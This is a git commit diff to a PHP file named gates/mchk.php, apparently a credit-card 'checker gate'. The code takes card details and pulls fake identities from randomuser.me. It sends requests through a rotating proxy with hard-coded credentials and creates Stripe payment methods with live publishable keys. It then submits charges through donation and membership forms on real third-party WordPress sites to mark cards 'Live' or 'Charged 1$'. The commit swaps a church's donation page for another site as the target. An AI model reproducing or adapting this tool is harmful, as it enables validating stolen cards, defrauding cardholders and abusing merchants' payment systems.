c127fbc9d6fc0972c78217370a5c151e58aa1fa1
GlooSmoke <147390858+GlooSmoke@users.noreply.github.com>
2024-04-12 08:05:23 +0700

    Update mchk.php

--- gates/mchk.php
+++ gates/mchk.php
@@ -47,6 +47,82 @@ $mes = $separa[1];
 $ano = $separa[2];
 $cvv = $separa[3];
 
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIE, 1); 
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+$resposta = curl_exec($ch);
+$firstname = value($resposta, '"first":"', '"');
+$lastname = value($resposta, '"last":"', '"');
+$phone = value($resposta, '"phone":"', '"');
+$zip = value($resposta, '"postcode":', ',');
+$state = value($resposta, '"state":"', '"');
+$email = value($resposta, '"email":"', '"');
+$city = value($resposta, '"city":"', '"');
+$street = value($resposta, '"street":"', '"');
+$numero1 = substr($phone, 1,3);
+$numero2 = substr($phone, 6,3);
+$numero3 = substr($phone, 10,4);
+$phone = $numero1.''.$numero2.''.$numero3;
+$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
+$serv_rnd = $serve_arr[array_rand($serve_arr)];
+$email= str_replace("example.com", $serv_rnd, $email);
+if($state=="Alabama"){ $state="AL";
+}else if($state=="alaska"){ $state="AK";
+}else if($state=="arizona"){ $state="AR";
+}else if($state=="california"){ $state="CA";
+}else if($state=="olorado"){ $state="CO";
+}else if($state=="connecticut"){ $state="CT";
+}else if($state=="delaware"){ $state="DE";
+}else if($state=="district of columbia"){ $state="DC";
+}else if($state=="florida"){ $state="FL";
+}else if($state=="georgia"){ $state="GA";
+}else if($state=="hawaii"){ $state="HI";
+}else if($state=="idaho"){ $state="ID";
+}else if($state=="illinois"){ $state="IL";
+}else if($state=="indiana"){ $state="IN";
+}else if($state=="iowa"){ $state="IA";
+}else if($state=="kansas"){ $state="KS";
+}else if($state=="kentucky"){ $state="KY";
+}else if($state=="louisiana"){ $state="LA";
+}else if($state=="maine"){ $state="ME";
+}else if($state=="maryland"){ $state="MD";
+}else if($state=="massachusetts"){ $state="MA";
+}else if($state=="michigan"){ $state="MI";
+}else if($state=="minnesota"){ $state="MN";
+}else if($state=="mississippi"){ $state="MS";
+}else if($state=="missouri"){ $state="MO";
+}else if($state=="montana"){ $state="MT";
+}else if($state=="nebraska"){ $state="NE";
+}else if($state=="nevada"){ $state="NV";
+}else if($state=="new hampshire"){ $state="NH";
+}else if($state=="new jersey"){ $state="NJ";
+}else if($state=="new mexico"){ $state="NM";
+}else if($state=="new york"){ $state="LA";
+}else if($state=="north carolina"){ $state="NC";
+}else if($state=="north dakota"){ $state="ND";
+}else if($state=="Ohio"){ $state="OH";
+}else if($state=="oklahoma"){ $state="OK";
+}else if($state=="oregon"){ $state="OR";
+}else if($state=="pennsylvania"){ $state="PA";
+}else if($state=="rhode Island"){ $state="RI";
+}else if($state=="south carolina"){ $state="SC";
+}else if($state=="south dakota"){ $state="SD";
+}else if($state=="tennessee"){ $state="TN";
+}else if($state=="texas"){ $state="TX";
+}else if($state=="utah"){ $state="UT";
+}else if($state=="vermont"){ $state="VT";
+}else if($state=="virginia"){ $state="VA";
+}else if($state=="washington"){ $state="WA";
+}else if($state=="west virginia"){ $state="WV";
+}else if($state=="wisconsin"){ $state="WI";
+}else if($state=="wyoming"){ $state="WY";
+}else{$state="KY";}
+
 $username = "g7305bhx467p4yl";
 $password = "ugv0ew3w009j5ii";
 $PROXYSCRAPE_PORT = 6060;
@@ -82,7 +158,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=0ce0b1a7-2f22-4a1f-816d-ace0c04ec3ab6cf4d3&sid=aed35807-93c7-4391-bb5b-6d196949264c0000a2&pasted_fields=number&payment_user_agent=stripe.js%2F25059d5c42%3B+stripe-js-v3%2F25059d5c42%3B+card-element&referrer=https%3A%2F%2Fcjchurchofthenazarene.org&time_on_page=24366&key=pk_live_5PL2RccRKsIr1AFripTd0pwr00p1moUAQP');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=7087376c-dbb2-4568-834b-165223143665764379&sid=96468abf-e91c-44c2-80af-76573840b91188be16&pasted_fields=number&payment_user_agent=stripe.js%2F65b2ba26d0%3B+stripe-js-v3%2F65b2ba26d0%3B+card-element&referrer=https%3A%2F%2Flimitlessflowposing.com&time_on_page=146002&key=pk_live_51MyCQkKq1yP3KvSUU0Gf5ydVtq6MPmZiORQgOAyblzRlS9QGoX0QBsu5qyhd3IXy3UPtNILNmkIwbvpRkpUukcFS00W0Sy8AJG');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -95,7 +171,7 @@ $PROXYSCRAPE_PORT = 6060;
 $PROXYSCRAPE_HOSTNAME = 'rp.proxyscrape.com';
 
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://cjchurchofthenazarene.org/wp-admin/admin-ajax.php?t=1712824335722');
+curl_setopt($ch, CURLOPT_URL, 'https://limitlessflowposing.com/wp-admin/admin-ajax.php?t=1712882764062');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
@@ -110,22 +186,22 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1712824335722 h2',
-'Host: cjchurchofthenazarene.org',
+'POST /wp-admin/admin-ajax.php?t=1712882764062 h2',
+'Host: limitlessflowposing.com',
 'accept: */*',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'origin: https://cjchurchofthenazarene.org',
+'origin: https://limitlessflowposing.com',
 'sec-fetch-site: same-origin',
 'sec-fetch-mode: cors',
 'sec-fetch-dest: empty',
-'referer: https://cjchurchofthenazarene.org/donate/',
+'referer: https://limitlessflowposing.com/community-membership-site/',
 'accept-language: en-US,en;q=0.9',
    ));
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D1508%26_fluentform_2_fluentformnonce%3D11af5c4962%26_wp_http_referer%3D%252Fdonate%252F%26payment_input%3DOther%26custom-payment-amount%3D1%26input_radio%3DThis%2520is%2520a%2520General%2520Donation%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26payment_method%3Dstripe%26ct_bot_detector_event_token%3D93d7648912b02c82f59945f881ae448720e48da3402ee69b3ef8a1f7c3bc2e35%26apbct_visible_fields%3DeyIwIjp7InZpc2libGVfZmllbGRzIjoiY3VzdG9tLXBheW1lbnQtYW1vdW50IG5hbWVzW2ZpcnN0X25hbWVdIG5hbWVzW2xhc3RfbmFtZV0gZW1haWwiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6NCwiaW52aXNpYmxlX2ZpZWxkcyI6Il9fZmx1ZW50X2Zvcm1fZW1iZGVkX3Bvc3RfaWQgX2ZsdWVudGZvcm1fMl9mbHVlbnRmb3Jtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciBwYXltZW50X21ldGhvZCBjdF9ib3RfZGV0ZWN0b3JfZXZlbnRfdG9rZW4gY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZCIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjZ9fQ%253D%253D%26__entry_intermediate_hash%3Dfe70f756b08097c1adb621f725b8afdf%26ct_no_cookie_hidden_field%3D_ct_no_cookie_data_eyJhcGJjdF90aW1lc3RhbXAiOiIxNzEyODI0MjI5IiwiYXBiY3RfdXJscyI6IntcImNqY2h1cmNob2Z0aGVuYXphcmVuZS5vcmcvZG9uYXRlL1wiOlsxNzEyODI0MjI5XX0iLCJjdF9oYXNfc2Nyb2xsZWQiOnRydWUsImN0X21vdXNlX21vdmVkIjp0cnVlLCJjdF9jb29raWVzX3R5cGUiOiJub25lIiwiYXBiY3RfaGVhZGxlc3MiOiJmYWxzZSIsImFwYmN0X3Zpc2libGVfZmllbGRzIjoiJTdCJTIydmlzaWJsZV9maWVsZHMlMjIlM0ElMjJjdXN0b20tcGF5bWVudC1hbW91bnQlMjBuYW1lcyU1QmZpcnN0X25hbWUlNUQlMjBuYW1lcyU1Qmxhc3RfbmFtZSU1RCUyMGVtYWlsJTIyJTJDJTIydmlzaWJsZV9maWVsZHNfY291bnQlMjIlM0E0JTJDJTIyaW52aXNpYmxlX2ZpZWxkcyUyMiUzQSUyMl9fZmx1ZW50X2Zvcm1fZW1iZGVkX3Bvc3RfaWQlMjBfZmx1ZW50Zm9ybV8yX2ZsdWVudGZvcm1ub25jZSUyMF93cF9odHRwX3JlZmVyZXIlMjBwYXltZW50X21ldGhvZCUyMGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiUyMGFwYmN0X3Zpc2libGVfZmllbGRzJTIwX19lbnRyeV9pbnRlcm1lZGlhdGVfaGFzaCUyMGN0X25vX2Nvb2tpZV9oaWRkZW5fZmllbGQlMjIlMkMlMjJpbnZpc2libGVfZmllbGRzX2NvdW50JTIyJTNBOCU3RCIsImN0X2ZrcF90aW1lc3RhbXAiOiIxNzEyODI0MjM1IiwiY3Rfc2NyZWVuX2luZm8iOiIlN0IlMjJmdWxsV2lkdGglMjIlM0EzOTMlMkMlMjJmdWxsSGVpZ2h0JTIyJTNBMTU3OSUyQyUyMnZpc2libGVXaWR0aCUyMiUzQTM5MyUyQyUyMnZpc2libGVIZWlnaHQlMjIlM0E3NDMlN0QiLCJjdF9jaGVja2pzIjoiODE2OTUyODg1IiwiY3RfdGltZXpvbmUiOiI3IiwiYXBiY3RfcGl4ZWxfdXJsIjoiaHR0cHMlM0ElMkYlMkZtb2RlcmF0ZTMtdjQuY2xlYW50YWxrLm9yZyUyRnBpeGVsJTJGNDgzNzAyZDUxZjg0YjhiYTdkYzRlYzdkMjhkMGU0NzUuZ2lmIiwiY3RfY2hlY2tlZF9lbWFpbHMiOiIlN0IlMjJnbG9vc21va2UlNDBnbWFpbC5jb20lMjIlM0ElN0IlMjJyZXN1bHQlMjIlM0ElMjJDQUNIRUQlMjIlMkMlMjJ0aW1lc3RhbXAlMjIlM0ExNzEyODI0MjQ3JTdEJTdEIiwiY3RfaGFzX2tleV91cCI6InRydWUiLCJjdF9wc190aW1lc3RhbXAiOiIxNzEyODI0MjMzIiwiYXBiY3RfcGFnZV9oaXRzIjoxLCJjdF9oYXNfaW5wdXRfZm9jdXNlZCI6InRydWUiLCJhcGJjdF9zaXRlX2xhbmRpbmdfdHMiOiIxNzEyODI0MjI5IiwiYXBiY3RfY29va2llc190ZXN0IjoiJTdCJTIyY29va2llc19uYW1lcyUyMiUzQSU1QiUyMmFwYmN0X3RpbWVzdGFtcCUyMiUyQyUyMmFwYmN0X3NpdGVfbGFuZGluZ190cyUyMiU1RCUyQyUyMmNoZWNrX3ZhbHVlJTIyJTNBJTIyMzcxNWY2NzFhM2Y0MWQwMDY1NmQxZDQzYzcyMDdmZjglMjIlN0QiLCJjdF9wb2ludGVyX2RhdGEiOiIlNUIlNUIxNzMlMkMzMDglMkMzNTI2JTVEJTJDJTVCMjAyJTJDMzA1JTJDNDI0MyU1RCUyQyU1QjMxNCUyQzI2NyUyQzUzNjUlNUQlMkMlNUI1MzQlMkMyMjklMkM4MTQ4JTVEJTJDJTVCNjglMkM2NyUyQzk1ODElNUQlMkMlNUIxNzklMkMyNzglMkMxMDI4NCU1RCUyQyU1QjI5MCUyQzE2OCUyQzExMjg3JTVEJTJDJTVCMzg5JTJDMTQwJTJDMTIyMzIlNUQlMkMlNUI0NTUlMkMxMjYlMkMxMzk4OSU1RCUyQyU1QjUyNCUyQzE3OCUyQzI1MjgwJTVEJTVEIiwiYXBiY3Rfc2Vzc2lvbl9pZCI6InpoZWl0IiwiYXBiY3Rfc2l0ZV9yZWZlcmVyIjoiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8iLCJhcGJjdF9zZXNzaW9uX2N1cnJlbnRfcGFnZSI6Imh0dHBzOi8vY2pjaHVyY2hvZnRoZW5hemFyZW5lLm9yZy9kb25hdGUvIiwidHlwbyI6W119%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=2');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D2714%26_fluentform_15_fluentformnonce%3De39aa6cba5%26_wp_http_referer%3D%252Fcommunity-membership-site%252F%26name%255Bfirst_name%255D%3DGloosmoke%26email%3D'.$email.'%26phone%3D%252B66817480671%26input_text_2%3Dgaungyellhtet%26input_text_3%3DGoogle%26input_text_4%3DNY%26input_text%3DNY%26input_text_5%3DNY%26input_text_6%3DNY%26input_text_7%3DNY%26input_text_8%3DNY%26input_text_9%3DNY%26input_text_10%3DNY%26payment_input%3D0%26payment-coupon%3D%26payment_method%3Dstripe%26__ff_all_applied_coupons%3D%26__entry_intermediate_hash%3Df44e0152a81928537d060eb2542a8216%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=15');
 
 $result2a = curl_exec($ch);
 
@@ -197,7 +273,7 @@ $response = "Expired Card 🚫";
   }
 
 
-elseif (strpos($result2a, 'Thank you for your donation.')){
+elseif (strpos($result2a, 'redirectUrl')){
   $status = "Live 🟢";
 $response = "Charged 1$ ✅";
 
